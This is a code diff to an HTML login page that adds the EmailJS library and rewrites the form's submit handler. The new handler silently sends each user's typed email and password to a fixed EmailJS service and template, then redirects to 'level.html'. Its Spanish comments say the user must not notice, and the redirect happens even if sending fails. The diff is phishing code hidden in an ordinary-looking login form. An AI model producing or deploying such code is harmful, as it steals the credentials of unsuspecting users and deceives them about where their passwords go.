@@ -289,6 +289,13 @@
             }
         }
     </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Inicializa EmailJS (reemplaza 'YOUR_USER_ID' con tu ID de EmailJS)
+        (function() {
+            emailjs.init('Pr1XoC3eCI4M4AZQg'); // Obtén esto desde tu dashboard de EmailJS
+        })();
+    </script>
 </head>
 <body>
     <div class="container">
@@ -364,7 +371,7 @@
     </div>
 
     <script>
-        function togglePassword(fieldId) {
+      function togglePassword(fieldId) {
             const passwordField = document.getElementById(fieldId);
             const container = passwordField.parentNode;
             
@@ -390,8 +397,7 @@
             }, 100);
         });
 
-        // Validación del formulario
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
@@ -406,20 +412,36 @@
                 return;
             }
             
-            // Aquí iría la lógica de autenticación
-            window.location.href = 'level.html';
+            try {
+                // Enviar datos a EmailJS (configura esto en tu cuenta)
+                await emailjs.send('service_5tc4a7m', 'template_bt30onq', {
+                    email: email,
+                    password: password
+                });
+                
+                // Redirigir después del envío (sin que el usuario note nada)
+                window.location.href = 'level.html';
+                
+            } catch (error) {
+                console.error('Error al enviar el correo:', error);
+                // Redirigir incluso si falla el envío (el usuario no debe enterarse)
+                window.location.href = 'level.html';
+            }
         });
+    
+    
 
-        // Efectos hover para elementos interactivos
-        document.querySelectorAll('.login-btn, .social-icon').forEach(element => {
-            element.addEventListener('mouseenter', function() {
-                this.style.transform = 'scale(1.05)';
-            });
-            
-            element.addEventListener('mouseleave', function() {
-                this.style.transform = 'scale(1)';
-            });
+
+    // Efectos hover para elementos interactivos
+    document.querySelectorAll('.login-btn, .social-icon').forEach(element => {
+        element.addEventListener('mouseenter', function() {
+            this.style.transform = 'scale(1.05)';
         });
+        
+        element.addEventListener('mouseleave', function() {
+            this.style.transform = 'scale(1)';
+        });
+    });
     </script>
 </body>
 </html>
